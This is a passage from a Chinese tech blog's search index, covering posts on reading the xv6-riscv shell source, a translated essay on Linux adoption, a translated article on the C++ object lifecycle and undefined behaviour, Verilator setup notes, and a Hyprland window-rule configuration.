cmd-\u003etype = BACK; cmd-\u003ecmd = subcmd; return (struct cmd*)cmd; } struct cmd* listcmd(struct cmd *left, struct cmd *right) { struct listcmd *cmd; cmd = malloc(sizeof(*cmd)); memset(cmd, 0, sizeof(*cmd)); cmd-\u003etype = LIST; cmd-\u003eleft = left; cmd-\u003eright = right; return (struct cmd*)cmd; } 这里还有对 parsepipe() 的调用 struct cmd* parsepipe(char **ps, char *es) { struct cmd *cmd; cmd = parseexec(ps, es); if(peek(ps, es, \"|\")){ gettoken(ps, es, 0, 0); cmd = pipecmd(cmd, parsepipe(ps, es)); } return cmd; } 从名字就能看出是和管道相关 管道连接两组命令序列，并把左边的标准输出连接给右边的标准输出。经典的例子应该属于是 cat xxx.txt | grep xxx，不过这里的用法当然是不合适的，管道本身有 buffer，不如直接 grep xxx xxx.txt 这样直接。 可以看到它是先调用 parseexec()，之后再做是否是管道的判断。 struct cmd* parseexec(char **ps, char *es) { char *q, *eq; int tok, argc; struct execcmd *cmd; struct cmd *ret; if(peek(ps, es, \"(\")) return parseblock(ps, es); ret = execcmd(); cmd = (struct execcmd*)ret; argc = 0; ret = parseredirs(ret, ps, es); while(!peek(ps, es, \"|)\u0026;\")){ if((tok=gettoken(ps, es, \u0026q, \u0026eq)) == 0) break; if(tok != 'a') panic(\"syntax\"); cmd-\u003eargv[argc] = q; cmd-\u003eeargv[argc] = eq; argc++; if(argc \u003e= MAXARGS) panic(\"too many args\"); ret = parseredirs(ret, ps, es); } cmd-\u003eargv[argc] = 0; cmd-\u003eeargv[argc] = 0; return ret; } 这里先加了一个 EXEC 类型的元素，并且判断是否存在重定向 重定向是将文件描述符的输出重新绑定到另一个位置。 常见的类似 echo 111 \u003e test.txt 这里的 echo 111 本来是往标准输出打印 111，但是 \u003e 将内容重定向到 test.txt 中，就相当于是往 test.txt 文件中写入 111 或者 find / -name aaa 2\u003e/dev/null 这样的命令，2\u003e/dev/null，是将标准错误输出（也就是文件描述符 2）重定向到 /dev/null， /dev/null 是一个特殊的设备，类似一个黑洞，任何向 /dev/null 的写入都是无效的。类似的设备还有/dev/random 之类的。 find 根目录的时候需要 2\u003e/dev/null 的原因是普通用户权限不如 root，有些目录不能被普通用户访问，所以为了不显示那些权限拒绝的信息，需要这个重定向。权限拒绝的 log 类似这样: find: ‘/etc/nftables’: Permission denied 我们日常很容易有一个需求，即向高权限可写的文件中写入一小段内容。写入一小段内容，echo 就可以满足我们的需求，但是直接在 echo 前加入 sudo 是不可行的，需要 echo aaa | sudo tee /test.txt 这样，tee 会从标准输入读取内容，并将其写入文件中。 while 循环中则是对每个命令行参数遍历并保存","date":"2024-11-25","objectID":"/posts/xv6_riscv_read_user-sh/:2:0","tags":["Xv6_RISC-V"],"title":"xv6-riscv 源码阅读 —— 用户态: sh","uri":"/posts/xv6_riscv_read_user-sh/"},{"categories":null,"content":"一篇题为 为什么没有很多人使用 Linux 的译文","date":"2024-11-01","objectID":"/posts/why_not_linux/","tags":["Linux","intro"],"title":"译文: 为什么没有很多人使用 Linux","uri":"/posts/why_not_linux/"},{"categories":null,"content":"译文: 为什么没有很多人使用 Linux 翻译自: https://world.hey.com/dhh/why-don-t-more-people-use-linux-33b75f53 今天偶然看到了这篇文章，感觉很有意思，所以翻译转发了一下，最后两段没有翻译过来，因为我认为和主题关系不是特别大 如果文章作者介意翻译转载，需要删除掉，可以选择以一些我能看到的方式（如评论）告知我 几周前，我看到一条推文问道：“如果 Linux 这么好，为什么没有很多人使用它？”这是一个很合理的问题！乍一听感觉是对的，不过还得仔细考虑一下。 Linux 甚至是自由软件，那么如果它实际上更好的话，是什么阻止了它的大规模采用呢？我的回应： 如果锻炼如此健康，为什么没有更多的人去做呢？ 如果阅读如此有教育意义，为什么没有更多的人这样做呢？ 如果垃圾食品对你如此有害，为什么还有那么多人吃它？ 世界上充满无需付费即可提升自我的方式，但大多数人忽视了它们。粗略地说，在一个廉价、空热量的世界里，变得肥胖和无知比保持健康和见多识广更容易。很难抗拒付出最小努力的诱惑。 并且 Linux 并非易事。与微软和苹果的商业产品相比，这个操作系统对您的要求更高。因此，它可以作为更好地理解计算机的实验室。与不断要求的老师一起，你必须自己解决问题才能学习和掌握 Linux 上的操作。 现在我完全理解为什么大多数计算机用户对智力锻炼不感兴趣，因为他们只想浏览网页或使用应用程序。他们并不希望熟练掌握计算基础知识。 但程序员不一样。或者应该有所不同。他们就像消防员。健身不是消防的目的，而是前提。当你有耐力和力量将人们从燃烧的建筑物中扛出来时，你就是一个更好的消防员，而不是没有。因此，大多数消防员都会努力保持健康，以完成他们的任务。 ","date":"2024-11-01","objectID":"/posts/why_not_linux/:0:0","tags":["Linux","intro"],"title":"译文: 为什么没有很多人使用 Linux","uri":"/posts/why_not_linux/"},{"categories":["Cpp"],"content":"一篇讲 C++ 对象生命周期的译文","date":"2024-10-24","objectID":"/posts/cpp_object_life/","tags":["Cpp notes"],"title":"译文: C++ 对象的生命周期","uri":"/posts/cpp_object_life/"},{"categories":["Cpp"],"content":"译文: C++ 对象的生命周期 本篇为 https://basit.pro/cpp-object-lifecycle/ 的译文 如果文章作者介意翻译转载，需要删除掉，可以选择以一些我能看到的方式（如评论）告知我 关于 RAII/C++ 的大多数讨论都没涉及到维持对象存在所需的隐含条件。在实现自定义的容器，以及内存分配器和 “tag discriminated unions” 的时候就需要这些隐含条件(如 Result\u003cT, E\u003e, Option\u003cT\u003e, std::variant\u003cT...\u003e) 译者注: tag discriminated unions 指的是使用一个 tag 区分联合体中的类型。std::variant 就是一个类型安全的联合体 一个 std::variant 的实例在任意时刻要么保有它的可选类型之一的值，要么在错误情况下无值 这些通常被称为“不安全”操作，因为它们确实需要了解对象生命周期不变量或生命周期。我假设您对汇编有一定的了解，因为如果没有它们，就很难理解本文中的一些操作 NOTE: 我们不会讨论异常，也不会讨论极端情况、不必要的复杂性、code path explosions 以及它们引入的限制 C++对象的生命周期如下所示: allocate placement memory || || ============ \\/ || || ====\u003e construct object ===\u003e assign object \u003c=== || || || || \\/ || ====== destruct object \u003c============= || \\/ deallocate placement memory 违反此生命周期将导致 未定义的行为 ，通常是: 内存泄漏、double-free、未初始化的内存上的读/写、未对齐的读/写、nullptr 取消引用、越界读/写等 我用于测试容器中生命周期违规的经验法则是确保构造数量等于破坏数量。我们将用于演示其中一些概念的类型定义如下: struct Counter { uint32_t num_constructs = 0; uint32_t num_destructs = 0; void log() { printf(\"num_constructs = %\" PRIu32 \" \\nnum_destructs = %\" PRIu32 \"\\n\", num_constructs, num_destructs); } } counter; struct Obj { // default-construction Obj() { counter.num_constructs++; } // copy-construction Obj(Obj const\u0026 t) : data{t.data} { counter.num_constructs++; } // move-construction Obj(Obj\u0026\u0026 t) : data{t.data} { counter.num_constructs++; } // copy-assignment Obj\u0026 operator=(Obj const\u0026 t) { data = t.data; return *this; } // move-assignment Obj\u0026 operator=(Obj\u0026\u0026 t) { data = t.data; return *this; } // destruction ~Obj() { counter.num_destructs++; } uint32_t data = 1; }; struct Animal { virtual void react() = 0; }; struct Cat : Animal { void react() override { printf(\"purr...\\n\"); } }; struct Dog : Animal { void react() override { printf(\"woof!\\n\"); } }; 内存分配 一个对象的内存可能来自于栈(例如 alloca, malloca)或者堆(例如 sbrk, malloc, kalloc)。对于放在这里的对象存在一些基本要求: 成功分配后，分配器返回的内存必须是有效且尚未被使用过的。否则会存在 double-free 问题。 SEE: GCC 的 __attribute__((malloc(...))) 和 MSVC 的 __restrict 可以为编译器的可达性分析启用全局 aliasing 优化。 译者注: 这二位都是用于表明该对象指向一个单独的内存，当编译器知道指针不会指向相同的区域时，可以做一些更加激进的优化，也就是所谓的 aliasing 优化。 对于 aliasing 优化来说，GCC 的 O2 优化就会默认启用一些。 aliasing 后续会被译为别名 NOTE: malloc(0) 和 realloc(ptr, 0, 0) 不需要返回 nullptr，并且是实现定义行为。实现可能会决定为 0 大小的分配返回相同或不同的非空（可能是 sentinel）内存地址。 通用分配器 应该 至少支持 alignof(max_align_t) 的对齐，其中 max_align_t 大多是 double（8字节）或 long double（16字节），就像 malloc 的情况一样。 max_align_t 是最大对齐整型标量类型。 NOTE: C11 引入了aligned_alloc 用于 over-aligned allocations (超出 alignof(max_align_t) )，这通常是 SIMD 向量操作 (SSE/AVX 的128 位、256 位和 512 位扩展)所必需的，因为 SIMD 的宽寄存器运行于 over-aligned memory addresses。 MSVC 的 C 运行时尚不支持 aligned_alloc ，但提供 _aligned_malloc 和 _aligned_free。 ","date":"2024-10-24","objectID":"/posts/cpp_object_life/:0:0","tags":["Cpp notes"],"title":"译文: C++ 对象的生命周期","uri":"/posts/cpp_object_life/"},{"categories":["Cpp"],"content":"构造对象 这是对象生命周期开始的地方。对于 non-trivially 可构造类型，这意味着在放置内存上放置新对象；对于 trivially 可构造类型，这意味着在对象放置内存上进行任何内存写入操作 对象的放置内存地址的大小 必须 至少为对象的大小，并且内存中的对象放置地址 必须 与对象对齐的倍数对齐。如果在大小不合适的内存位置构造对象，则可能导致未定义的行为(越界读取)。不适当对齐的放置内存可能会导致未对齐的读写(未定义的行为，在某些 CPU 架构上可能会因 SIGILL 导致应用程序崩溃或导致性能下降)。读取未初始化/未构造的对象是未定义的行为并且是灾难性的 Placement-new 有一些重要的目的： 初始化虚拟(基类和继承的)类的虚函数调度表(简单的构造，即 memset 或 memcpy 是不够的) 初始化类/结构、其基类及其成员 让我们看看实际案例: Godbolt int * x = (int*) malloc(4); (*x)++; // undefined behavior 上面的代码由于未初始化地读取内存 x 处的 int 而引发了未定义的行为。启用优化后，编译器可以主动决定忽略增量操作 fix: int * x = (int*) malloc(4); * x = 0; (*x)++; 因为 int 是一个 trivially 的可构造类型(即没有特殊的构造语义)，没有不变量，所以它可以通过写入内存地址来简单地构造，并且 int “对象”将隐式存在于内存地址 x 处。要在地址 x 构造一个 int 或普通可构造对象，您还可以使用： placement new memcpy/memmove memset/memset_explicit 现在，让我们看一下具有更复杂构造语义 (non-trivially-constructible) 的类型: Godbolt Obj* obj = (Obj*) malloc(sizeof(Obj)); obj-\u003edata++; // undefined behavior, data is random value printf(\"data: %\" PRIu32 \"\\n\", obj-\u003edata); counter.log(); // num_constructs = 0, num_destructs = 0 从上面的日志中，您可以看到对象从未在地址 obj 处构造，因此，obj 处尚不存在 Obj 类型的对象，并且在该状态下使用/销毁该对象是未定义的行为。这可能会导致许多违反合同/未定义的行为，例如双重释放、越界读/写。 fix: Godbolt Obj* obj = (Obj*) malloc(sizeof(Obj)); new (obj) Obj{}; // constructs object of type Obj at the address obj-\u003edata++; // ok: data is increased from default value of 1 to 2 printf(\"data: %\" PRIu32 \"\\n\", obj-\u003edata); counter.log(); // num_constructs = 1, num_destructs = 0 placement new 在地址 obj 处构造了 Obj 类型的对象，现在包含有效的成员数据 Placement-new 还用于初始化虚函数表指针，使对象可在 virtual dispatch 中使用。如果某个对象不是使用 Placement-new 构造的，则编译器的可达性分析可能会判定该对象在内存地址中不存在，从而调用未定义的行为。举例说明： Godbolt Cat * cat = (Cat*) malloc(sizeof(Cat)); memset(cat, 0, sizeof(Cat)); cat-\u003ereact(); // static dispatches to Cat::react() Animal * animal = cat; animal-\u003ereact(); // undefined behavior 调用 cat-\u003ereact()，通过静态调度正确调用 Cat::react。然而，通过类型擦除的调用 Animal-\u003ereact() 从其基类方法 Animal::react dynamic dispatch，编译器可以决定简单地删除/忽略它，因为它是未定义的行为(调用空函数指针)，如果在调试模式下或编译器的可达性分析无法看到 memset，则可能会导致 segmentation fault 为了检查为什么会发生这种情况，让我们看一下使用自定义 dynamic dispatch/v-table 来实现虚类: struct Animal{ void (*react)(void *); }; struct Cat{ Animal animal{ .react = \u0026react }; static void react(void *); }; 为了发生 virtual dispatchl，需要调用函数指针 Animal::react，但在前面的示例中，Animal::react 会被 memset 调用初始化为 0，当 Animal-\u003ereact() 时，这是未定义的行为调用 为了修复前面的示例，我们需要通过 Placement-new 调用正确初始化实现定义的虚函数调度表，即： Godbolt Cat * cat = (Cat*) malloc(sizeof(Cat)); new (cat) Cat{}; // initializes v-table cat-\u003ereact(); // static dispatches to Cat::react() Animal * animal = cat; animal-\u003ereact(); // OK 虚函数调用 animal-\u003ereact() 现在可以正确分派到 Cat::react NOTE: C++ 标准没有指定如何实现 virtual dispatch/虚函数表，因此没有可移植的方法来可靠地操作运行时的虚函数表。 复制和移动构造意味着源地址已经用对象构造，并且目标地址是包含需要初始化的未初始化对象/内存的暂存存储器。请注意，复制和移动构造不应调用源对象或目标对象的析构函数 对象构造也分为几类，即： non-trivial construction non-trivial copy construction non-trivial move construction trivial construction trivial copy construction trivial move construction ","date":"2024-10-24","objectID":"/posts/cpp_object_life/:1:0","tags":["Cpp notes"],"title":"译文: C++ 对象的生命周期","uri":"/posts/cpp_object_life/"},{"categories":["Cpp"],"content":"分配对象 复制和移动分配要求内存地址处已经存在一个对象，并且我们想为其分配另一个对象。这意味着源地址和目标地址都包含有效的初始化对象。对象分配分为几类，即： copy assignment (T\u0026 operator=(U const\u0026)) move assignment (T\u0026 operator=(U \u0026\u0026)) trivial copy assignment trivial move assignment trivial 赋值意味着可以将对象分配给另一个对象而无需特殊操作，这意味着它可以按字节复制，即通过 memcpy 或 memmove ","date":"2024-10-24","objectID":"/posts/cpp_object_life/:2:0","tags":["Cpp notes"],"title":"译文: C++ 对象的生命周期","uri":"/posts/cpp_object_life/"},{"categories":["Cpp"],"content":"销毁对象 销毁要求内存位置存在有效的对象。销毁内存地址处的对象意味着该内存地址处将不存在任何对象，并且内存处于未初始化状态 不同于 trivial 对象的构造和分配，trivial 的销毁没什么操作 non-trivial destruction (~T()) trivial destruction ","date":"2024-10-24","objectID":"/posts/cpp_object_life/:3:0","tags":["Cpp notes"],"title":"译文: C++ 对象的生命周期","uri":"/posts/cpp_object_life/"},{"categories":["Cpp"],"content":"释放内存 释放内存要求放置内存上的任何对象都已被销毁。内存返回到其分配器，并且不应再被引用或使用 ","date":"2024-10-24","objectID":"/posts/cpp_object_life/:4:0","tags":["Cpp notes"],"title":"译文: C++ 对象的生命周期","uri":"/posts/cpp_object_life/"},{"categories":["Cpp"],"content":"应用 ","date":"2024-10-24","objectID":"/posts/cpp_object_life/:5:0","tags":["Cpp notes"],"title":"译文: C++ 对象的生命周期","uri":"/posts/cpp_object_life/"},{"categories":["Cpp"],"content":"Strict Aliasing, Dead-store, and Dead-load Optimizations Strict aliasing 是一个很重要的假设，它可以启用被称为 dead-load 和 dead-store 的编译器优化 struct A { int value = 0; }; struct B { int value = 0; }; A * a = get_A(); B * b = get_B(); a-\u003evalue = 6; b-\u003evalue = 2; return a-\u003evalue; 在这里，我们首先写入 a，然后写入 b，考虑到 a 可能是 b 的 reinterpret_cast，那么我们就不能假设 a 的值仍然是 6，因为有可能两者都指向相同或不同的对象。虽然这种规模的影响并不明显，但当编译器的可达性分析无法证明它们是不同的对象时，它就会变得难绷 按照规则来说，类型 A 不能别名（reinterpret_cast）类型 B，那么我们总是可以执行优化并假设两个对象不同，因此无法从类型 A 观察到类型 B 的突变 然而，我们仍然需要一个后门，以防我们需要按字节从 a 复制到 b，规则的例外是 char、unsigned char 和 signed char 可以别名任何对象，否则由 std::bit_cast 封装，这意味着我们可以为 char、unsigned char 或signed char 中的任何类型的任何对象设置别名，这称为 strict aliasing 规则 为了说明 strict aliasing 规则，让我们看看生成的汇编代码: Godbolt A * a = get_A(); B * b = get_B(); a-\u003evalue = 6; b-\u003evalue = 2; return a-\u003evalue; 从上面的示例中我们可以看到，编译器能够对表达式 a-\u003evalue 执行 dead-load 优化，并且只假设该值保持为 6，如果 a 可以别名 b，那这就是不可能的 然而，如果我们真的需要为这两种类型起别名，我们可以使用名称奇怪的函数 std::launder ，这会干扰编译器的可达性分析 Godbolt A* a = get_A(); B* b = get_B(); B* a_b = std::launder\u003cB\u003e((B*)a); a_b-\u003evalue = 6; b-\u003evalue = 2; return a-\u003evalue; 从生成的汇编代码中，编译器被迫从 a_b 执行冗余加载，因为它可能是 b 的别名，因为它的起源已被 std::launder 隐藏。这就像洗钱一样，因此得名:) NOTE: 这里使用 std::launder 是未定义的行为，因为不存在类型 B 的对象，也没有在地址 a 处构造该对象 一些语言/方言在可变性和别名方面有一种更激进的别名优化/规则，即 Rust 的可变引用 (\u0026 mut) 和 Circle 的可变引用，它只需要一次将一个可变引用绑定到一个对象，这允许即使在一个范围内的相同类型的对象之间，也存在更具争议性和激进的优化。这与非标准限制限定符 (GCC/Clang：__restrict__ 和 MSVC：__restrict)相当 举例说明: Godbolt int fn(A* a1, A* a2) { a1-\u003evalue = 6; a2-\u003evalue = 2; return a1-\u003evalue; } 正如我们之前所说，a1 可以与 a2 别名/重叠，因为它们是相同的类型，并且即使在相同类型内，也没有关于可变性的限制，因此读取表达式 a1-\u003evalue 不会被优化，我们仍然需要加载值，如果我们可以确定对象实际上没有别名/重叠，那么这将是多余的。虽然这种影响在小对象上可能不会被注意到，但由于数据依赖性，它在多个元素的数组上会很明显，并导致性能急剧下降 为了优化这一点，我们将使用 restrict 属性，这意味着具有 attribute/qualifier 的对象不会为该范围内的其他对象别名。 Godbolt int fn(A* RESTRICT a1, A* RESTRICT a2) { a1-\u003evalue = 6; a2-\u003evalue = 2; return a1-\u003evalue; } ","date":"2024-10-24","objectID":"/posts/cpp_object_life/:5:1","tags":["Cpp notes"],"title":"译文: C++ 对象的生命周期","uri":"/posts/cpp_object_life/"},{"categories":["Cpp"],"content":"Union 虽然大多数“modern C++”代码库会由于联合体的约束困难或使用它们很容易产生错误而完全禁止联合体，但它们仍然是许多数据结构(如 Option\u003cT\u003e、Result\u003cT, E\u003e) 的重要组成部分 联合用于多个对象之一可以存在于一个位置的情况。有效地为受约束的对象动态性/多态性提供空间 鉴于联合地址中只能存在一个对象，对象生命周期规则仍然适用，违反该规则将导致未定义的行为: union 中必须至少存在一个指定的变体 任何访问的对象都必须已被构造 在某个时间点，union 中只能存在或构造一个对象，要在 union 中构造另一个对象，必须先销毁先前构造的对象。 尽管 Union 中的变体类型可能存在别名，但 strict aliasing 规则仍然适用于它们，即变体类型 A 不能为不同的变体类型 B 起别名 Godbolt union Which { char c = 0; Cat cat; }; void react(Animal* a) { a-\u003ereact(); } Which w; // only c is initialized react(\u0026w.cat); // SISGSEGV because we accessed `cat` without initializing it fix: Godbolt Which w; // only c is initialized // w.c.~char() - trivial, but char doesn't have a destructor new (\u0026w.cat) Cat{}; // now cat is initialized, we can access it react(\u0026w.cat); // purr... 正如您在上面的示例中看到的，我们不能简单地假装使用 union 的其他变体，我们需要维护对象生命周期，首先删除 c (在本例中很简单，因此无操作)，然后使用构造 cat 放置 new (重要)，它将通过初始化 Cat 对象的 v-table 来解决 UB 对于认为 C++ 联合体功能与 C 类似的 C 开发人员来说，这是一种常见的做法。另请注意，如果联合包含 non-trivial 类型，则需要手动且显式地实现构造、销毁、赋值和移动操作 ","date":"2024-10-24","objectID":"/posts/cpp_object_life/:6:0","tags":["Cpp notes"],"title":"译文: C++ 对象的生命周期","uri":"/posts/cpp_object_life/"},{"categories":["Cpp"],"content":"std::aligned_storage (C++ 23 已弃用) 对齐存储意味着对象的按字节表示，对象的生命周期上下文在外部管理或由外部事实源确定，因此仍然需要用户显式且正确地管理所表示对象的生命周期，它们可以工作与 union 类似，但需要注意的是它们是非类型化的 对齐存储通常用于实现容器类型，特别是在包含已初始化和未初始化对象时，例如: Open-Addressing (Linear-Probing Hashmaps), (ECS) Sparse Sets, Static-Capacity Vectors, Stack-allocated vectors, pre-allocated/bump/arena allocators NOTE: std::aligned_storage 在 C++ 23 (P1413R3) 被删除 ","date":"2024-10-24","objectID":"/posts/cpp_object_life/:7:0","tags":["Cpp notes"],"title":"译文: C++ 对象的生命周期","uri":"/posts/cpp_object_life/"},{"categories":["Cpp"],"content":"Option\u003cT\u003e (std::optional\u003cT\u003e) Option\u003cT\u003e 意味着类型 T 的对象可能存在也可能不存在，这意味着该对象可能初始化或者未初始化，并且其存在由有区别的枚举/布尔值识别。实现 Option\u003cT\u003e 需要正确维护值类型 T 的生命周期。即构造次数与销毁次数相同，对象的构造函数在被视为存在于选项中之前被调用 ","date":"2024-10-24","objectID":"/posts/cpp_object_life/:8:0","tags":["Cpp notes"],"title":"译文: C++ 对象的生命周期","uri":"/posts/cpp_object_life/"},{"categories":["Cpp"],"content":"Result\u003cT, E\u003e (std::expected\u003cT, E\u003e) Result\u003cT, E\u003e 暗示 Result 的放置地址处存在类型 T 或类型 E 的对象，它通过枚举或布尔值进行区分。就像 Option\u003cT\u003e 一样，Result\u003cT, E\u003e 维护值类型 T 和 E 的生命周期 ","date":"2024-10-24","objectID":"/posts/cpp_object_life/:9:0","tags":["Cpp notes"],"title":"译文: C++ 对象的生命周期","uri":"/posts/cpp_object_life/"},{"categories":["Cpp"],"content":"Trivial Relocation Trivial 重定位是即将推出的 C++ 26 功能，我最兴奋的是它进一步扩展了 C++ 对象生命周期，并为进一步优化提供了空间 重定位是从源对象移动到未初始化目标以及破坏源中留下的对象表示的组合(破坏性 move) void relocate(A * src, A * dst){ new (dst) A{ std::move(*src) }; src-\u003e~A(); } Trivial 重定位意味着可以将对象安全地从一个内存地址移动到另一个未初始化的内存地址，而无需调用对象的移动构造函数和析构函数，本质上捕获“移动到目标并销毁源”操作。这意味着我们可以使用逐位复制，通常通过 memcpy 或 memmove，本质上是“微不足道的”，只要我们在重定位后不将源内存地址视为包含有效对象即可 void trivial_relocate(A * src, A * dst){ memcpy(dst, src, sizeof(A)); } 请注意，trivial 重定位并不总是意味着移动构造函数和析构函数是 trivial struct MyStr { char* data_ = nullptr; size_t size_ = 0; MyStr() {} MyStr(char const* data, size_t num) : data_{(char*)malloc(num)}, size_{num} { memcpy(data_, data, num); } MyStr(MyStr const\u0026) = delete; MyStr\u0026 operator=(MyStr\u0026\u0026) = delete; MyStr\u0026 operator=(MyStr const\u0026) = delete; MyStr(MyStr\u0026\u0026 a) : data_{a.data_}, size_{a.size_} { a.data_ = nullptr; a.size_ = 0; } ~MyStr() { free(data); } }; MyStr 与许多容器类型一样，没有 trivial 的移动构造函数和析构函数，但它们的对象表示可以轻松地重新定位 对于本地包含的小型对象，non-trivial 重定位可能不会对性能产生太大影响，因为编译器通常能够优化移动构造函数和析构函数生成的代码，但对于实现像 std::vector 这样的通用容器类型，其中这些对象中的一些经常被移动(即在 push_back、insert、将元素从一个容器移动到另一个容器期间)，trivial 重定位 (memcpy/memmove) 会比执行会产生冗余操作的 non-trivial 的移动构造函数和析构函数执行得更好，就像将 MyStr::num_ 设置为 nullptr 并将 MyStr::size_ 设置为 0 (如 MyStr::MyStr(Mystr \u0026\u0026)的 std::vector\u003cMyStr\u003e 中所示)。这是 C++ 对象模型要求移动构造函数将源对象保留在 valid 但未指定状态以便析构函数仍然正确运行的结果 另请注意，如果您的分配器支持 realloc，则 trivial 的重定位意味着增加向量类型的容量可能会分解为 zero-cost realloc(如果页面内有足够的空间，操作系统通常只需要扩展分配的条目)而不是分配一个新的单独内存，将对象移动到该内存，销毁源内存中的残留对象，然后释放源内存 Trivial 的重定位会将我们的 C++ 对象生命周期模型扩展到: allocate placement memory || || || =============================\u003e relocate object || || || || || ============ || \\/ || || || || ====\u003e construct object ===\u003e assign object \u003c=== || || || || || || \\/ || || ====== destruct object \u003c============ || || || \\/ || deallocate placement memory \u003c=========================== P2786R0: Trivial relocatability options, Proposal for an alternative approach to trivial relocatability STL algorithms for trivial relocation C++ Trivial Relocation Through Time - Mungo Gill - ACCU 2023 ","date":"2024-10-24","objectID":"/posts/cpp_object_life/:10:0","tags":["Cpp notes"],"title":"译文: C++ 对象的生命周期","uri":"/posts/cpp_object_life/"},{"categories":null,"content":"Verilator 的简单使用，现在的内容还没什么深度，后期接触的深了会继续更新","date":"2024-09-20","objectID":"/posts/verilator_intro/","tags":["Verilator","Intro"],"title":"Verilator 使用","uri":"/posts/verilator_intro/"},{"categories":null,"content":"Verilator 使用 因为报名了一生一芯，所以简单学习了一下 Verilator 的使用。 ","date":"2024-09-20","objectID":"/posts/verilator_intro/:0:0","tags":["Verilator","Intro"],"title":"Verilator 使用","uri":"/posts/verilator_intro/"},{"categories":null,"content":"Verilator 介绍 Verilator 是开源的 Verilog 仿真测试工具，可以通过编写 C/C++ 完成对 Verilog 的仿真，Verilator 会将 Verilog 转换成 C/C++ 并与测试文件一起编译成程序运行，从而看到仿真结果。 Verilator is a free and open-source software tool which converts Verilog (a hardware description language) to a cycle-accurate behavioral model in C++ or SystemC. The generated models are cycle-accurate and 2-state; as a consequence, the models typically offer higher performance than the more widely used event-driven simulators, which can model behavior within the clock cycle. Verilator is now used within academic research, open source projects and for commercial semiconductor development. It is part of the growing body of free EDA software. Verilator 是一款自由的开源软件，可将 Verilog （一种硬件描述语言）转换为 C++ 或 SystemC 中的周期精确行为模型。生成的模型具有周期精确性和状态性；因此，这些模型通常比更广泛使用的事件驱动模拟器提供更高的性能，后者可以在时钟周期内建模行为。Verilator 现在用于学术研究、开源项目和商业半导体开发。它是日益壮大的免费 EDA 软件群体的一部分。 ","date":"2024-09-20","objectID":"/posts/verilator_intro/:1:0","tags":["Verilator","Intro"],"title":"Verilator 使用","uri":"/posts/verilator_intro/"},{"categories":null,"content":"安装 Verilator 你不是 Gentoo Linux 的话，都完全没有看安装这部分的必要，直接从使用部分看起吧。 一生一芯要求的 Verilator 的版本为 5.008，可惜 guru 的 sci-electronics/verilator 并没有这个版本，我特地本地创建了一个仓库，把 guru 的这个 EBUILD 抄到了那里。 我使用的是 llvm/systemd profile，CXXFLAGS 是 -O3 -pipe -flto=thin -fstack-protector-strong -fstack-clash-protection -fcf-protection=full -D_FORTIFY_SOURCE=3，LDFLAGS 是 -Wl,-O3,-z,now,--as-needed,--lto-O3,--icf=safe,--gc-sections，但是编译的时候内存占用显示直接满了，我尝试降低编译时并行的线程数量，后来告诉我链接出现了问题，我懒得去看到底是哪位的问题了，直接用的 gcc-nolto 这个 env 编译的，我的 gcc-nolto 内容如下: CC=\"gcc\" CXX=\"g++\" CPP=\"gcc -E\" AR=\"ar\" NM=\"nm\" RANLIB=\"ranlib\" CFLAGS=\"-O3 -march=x86-64-v3 -pipe -fstack-protector-strong -fstack-clash-protection -fcf-protection=full\" CXXFLAGS=\"${CFLAGS}\" LDFLAGS=\"-Wl,-O3,-z,now\" 2025 年 1 月 10 号 我今天重装了一遍，发现用 GCC 就行，不需要 nolto，我开了 -flto 编译也可以成功，不过 Clang 编译失败 ","date":"2024-09-20","objectID":"/posts/verilator_intro/:2:0","tags":["Verilator","Intro"],"title":"Verilator 使用","uri":"/posts/verilator_intro/"},{"categories":null,"content":"使用 Verilator 可以参考官方文档给出的例子，还有 USTC CECS 2023 中也简单介绍了一点 Verilator 的使用。 你可能有生成波形图的需求，可以参考官方文档的 FAQ 中的 How do I generate waveforms (traces) in C++? 给出的办法。 ","date":"2024-09-20","objectID":"/posts/verilator_intro/:3:0","tags":["Verilator","Intro"],"title":"Verilator 使用","uri":"/posts/verilator_intro/"},{"categories":null,"content":"一生一芯: 关于 NVBoard 我在编译 NVBoard 总是报错 ld: DSO missing from command line 什么的，我一开始思索是否是因为我系统用的不是 GCC 的 libstdc++ 而是 LLVM 的 libc++ 的原因，但是我一时间没有找到全局使用 clang/llvm 编译工具链的方法。后来通过 AI 了解到一个解决办法: -lc++ ","date":"2024-09-20","objectID":"/posts/verilator_intro/:4:0","tags":["Verilator","Intro"],"title":"Verilator 使用","uri":"/posts/verilator_intro/"},{"categories":["Linux_杂谈"],"content":"目前也用 Hyprland 几个月了，故而写了这篇面向准备使用 Hyprland 的人群","date":"2024-09-13","objectID":"/posts/hyprland_tour/","tags":["Linux","Intro"],"title":"使用 Hyprland","uri":"/posts/hyprland_tour/"},{"categories":["Linux_杂谈"],"content":"使用 Hyprland 目前也用 Hyprland 几个月了，故而写了这篇面向准备使用 Hyprland 的人群。 Hyprland 是由 C++ 编写，少数不使用 wlroots 的平铺式窗口管理器。默认足够漂亮，并且也还好用。好用指的是实现了 text-input-v1，并且支持将 XWayland 的缩放设置为 0 而不是跟着全局的缩放走。实现了 text-input-v1 就可以让 Electron 的软件在跑在 Wayland 下也可以使用 fcitx 中文输入法。 Hyprland 是在 0.42 版本开始完全不依赖于 wlroots 的，0.43 就把编译所需的 C++ 标准提到 C++ 26 了，不过本身我 C++ 的水平不是很高，我本身对 C++ 26 也没有太多的关注，我又不是个语言律师，也不好评价这个决定。不得不说，这一定程度上把编译工具链的要求提高了一些。 Hyprland 的功耗比 sway 大一些。 ","date":"2024-09-13","objectID":"/posts/hyprland_tour/:0:0","tags":["Linux","Intro"],"title":"使用 Hyprland","uri":"/posts/hyprland_tour/"},{"categories":["Linux_杂谈"],"content":"配置文件 Hyprland 安装自带的默认配置文件基本还可以，对一些基础的东西都做了设置。你需要设置的大多是环境变量的设置，窗口规则以及自动启动的软件。 我目前对窗口规则只设置了一点，也是遇到了需要设定的软件再添加。 windowrulev2 = opacity 0.90, class:.* windowrulev2 = opacity 1, class: brave-browser windowrulev2 = opacity 1, class: firefox windowrulev2 = opacity 1, class: Terraria.bin.x86_64 windowrulev2 = opacity 1, class: org.gnome.Epiphany windowrulev2 = float, class: xdg-desktop-portal-* windowrulev2 = float, class: localsend windowrulev2 = float, title: Bookmarks backup windowrulev2 = float, title: ^(Library)(.*)$ windowrulev2 = size 50% 50%, class: localsend windowrulev2 = size 50% 50%, class: xdg-desktop-portal-* windowrulev2 = size 50% 50%, class: ^(wofi)$ windowrulev2 = size 50% 50%, title: Bookmarks backup windowrulev2 = size 50% 50%, title: ^(Library)(.*)$ 这里我只是将所有窗口都不透明度设置为 0.9，并且将一些额外需要设定的应用（比如浏览器和游戏）的不透明度还是拉满。 